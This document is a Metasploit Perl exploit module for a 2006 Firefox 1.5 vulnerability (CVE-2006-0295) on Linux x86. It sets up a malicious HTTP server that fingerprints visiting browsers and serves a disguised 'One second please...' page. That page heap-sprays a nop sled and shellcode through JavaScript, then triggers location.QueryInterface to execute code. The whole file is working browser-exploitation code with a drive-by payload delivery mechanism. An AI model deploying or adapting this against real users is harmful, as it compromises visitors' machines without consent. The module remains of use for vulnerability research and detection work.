Mozilla Firefox 1.5 location.QueryInterface() Code Execution (linux)
====================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::firefox_queryinterface_linux;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

my $advanced =
  {
	&#039;Gzip&#039;       => [1, &#039;Enable gzip content encoding&#039;],
	&#039;Chunked&#039;    => [1, &#039;Enable chunked transfer encoding&#039;],
  };
  
my $info =
  {
	&#039;Name&#039;           => &#039;Firefox location.QueryInterface() Code Execution (Linux x86)&#039;,
	&#039;Version&#039;        => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039;        =>
	  [
		&#039;H D Moore <hdm [at] metasploit.com>&#039;,
	  ],

	&#039;Description&#039;    =>
	  Pex::Text::Freeform(qq{
		This module exploits a code execution vulnerability in the Mozilla
	Firefox browser. To reliably exploit this vulnerability, we need to fill
	almost a gigabyte of memory with our nop sled and payload. This module has
	been tested on Gentoo Linux with the stock Firefox 1.5.0 package.
}),

	&#039;Arch&#039;           => [ &#039;x86&#039; ],
	&#039;OS&#039;             => [ &#039;linux&#039; ],
	&#039;Priv&#039;           => 0,

	&#039;UserOpts&#039;       =>
	  {
		&#039;HTTPPORT&#039; => [ 1, &#039;PORT&#039;, &#039;The local HTTP listener port&#039;, 8080      ],
		&#039;HTTPHOST&#039; => [ 0, &#039;HOST&#039;, &#039;The local HTTP listener host&#039;, "0.0.0.0" ],
	  },

	&#039;Payload&#039;        =>
	  {
		&#039;Space&#039;    => 1024,
		&#039;BadChars&#039; => "\x00",
		&#039;Keys&#039;     => [&#039;-bind&#039;],
	  },
	&#039;Refs&#039;           =>
	  [
	  	[&#039;CVE&#039;, &#039;2006-0295&#039;],
	  	[&#039;BID&#039;, &#039;16476&#039;],
	  	[&#039;URL&#039;, &#039;http://www.mozilla.org/security/announce/mfsa2006-04.html&#039;],
	  ],

	&#039;DefaultTarget&#039;  => 0,
	&#039;Targets&#039;        =>
	  [
		[ &#039;Mozilla Firefox 1.5.0.0 on Linux x86&#039; ]
	  ],
	
	&#039;Keys&#039;           => [ &#039;mozilla&#039; ],

	&#039;DisclosureDate&#039; => &#039;Feb 02 2006&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar(&#039;HTTPHOST&#039;),
		LocalPort => $self->GetVar(&#039;HTTPPORT&#039;),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => &#039;tcp&#039;
	);
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar(&#039;HTTPPORT&#039;));
		return;
	}

	my $httphost = ($self->GetVar(&#039;HTTPHOST&#039;) eq &#039;0.0.0.0&#039;) ?
		Pex::Utils::SourceIP(&#039;1.2.3.4&#039;) :
		$self->GetVar(&#039;HTTPHOST&#039;);

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar(&#039;HTTPPORT&#039;) ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);
		

	# Read the HTTP command
	my ($cmd, $url, $proto) = split(/ /, $fd->RecvLine(10), 3);
	my $agent;
	
	# Read in the HTTP headers
	while ((my $line = $fd->RecvLine(10))) {
		
		$line =~ s/^\s+|\s+$//g;
		
		my ($var, $val) = split(/\:/, $line, 2);

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		$agent = $val if $var =~ /User-Agent/i;
	}
	
	my $os = &#039;Unknown&#039;;
	my $vl = ($agent =~ m/\/1\.5$/) ? &#039;Vulnerable&#039; : &#039;Not Vulnerable&#039;;
	
	$os = &#039;Linux&#039;     if $agent =~ /Linux/i;
	$os = &#039;Mac OS X&#039;  if $agent =~ /OS X/i;
	$os = &#039;Windows&#039;   if $agent =~ /Windows/i;	
	
	
	$self->PrintLine("[*] Client connected from $rhost:$rport ($os/$vl).");
	
	if ($os ne &#039;Linux&#039;) {
		$self->PrintLine("[*] Invalid target for this exploit, trying anyways...");
	} else {
		$self->PrintLine("[*] Sending payload and waiting for execution...");	
	}

	my $res = $fd->Send($self->BuildResponse($self->GenerateHTML()));

	$fd->Close();
}


sub JSUnescape {
	my $self = shift;
	my $data = shift;
	my $code = &#039;&#039;;
	
	# Encode the shellcode via %u sequences for JS&#039;s unescape() function
	my $idx = 0;
	while ($idx < length($data) - 1) {
		my $c1 = ord(substr($data, $idx, 1));
		my $c2 = ord(substr($data, $idx+1, 1));	
		$code .= sprintf(&#039;%%u%.2x%.2x&#039;, $c2, $c1);	
		$idx += 2;
	}
	
	return $code;
}

sub GenerateHTML {
	my $self        = shift;
	my $target      = $self->Targets->[$self->GetVar(&#039;TARGET&#039;)];
	my $shellcode   = $self->JSUnescape($self->GetVar(&#039;EncodedPayload&#039;)->Payload);
	my $data        = qq#
<html>
<head>
	<title>One second please...</title>
	<script language="javascript">

		function BodyOnLoad() {
			h = FillHeap();
			location.QueryInterface(eval("Components.interfaces.nsIClassInfo"));
		};
		
		function FillHeap() {
			// Filler
			var m = "";
			var h = "";
			var a = 0;
			
			// Nop sled
			for(a=0; a<(1024*512); a++)
				m += unescape("\%u9090");

			// Payload
			m += unescape("$shellcode");
			
			// Repeat
			for(a=0; a<1024; a++)
				h += m;
			
			// Return
			return h;
		}
	</script>
</head>
<body onload="BodyOnLoad()">
</body>
</html>
#;
	return $data;
}

sub BuildResponse {
	my ($self, $content) = @_;

	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: text/html\r\n";

	if ($self->GetVar(&#039;Gzip&#039;)) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar(&#039;Chunked&#039;)) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= &#039;Content-Length: &#039; . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), &#039;&#039;);
		$chunked .= sprintf(&#039;%x&#039;, length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, &#039;gzip&#039;, &#039;-&#039;.$comp, &#039;-c&#039;, &#039;--force&#039;);
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}
1;



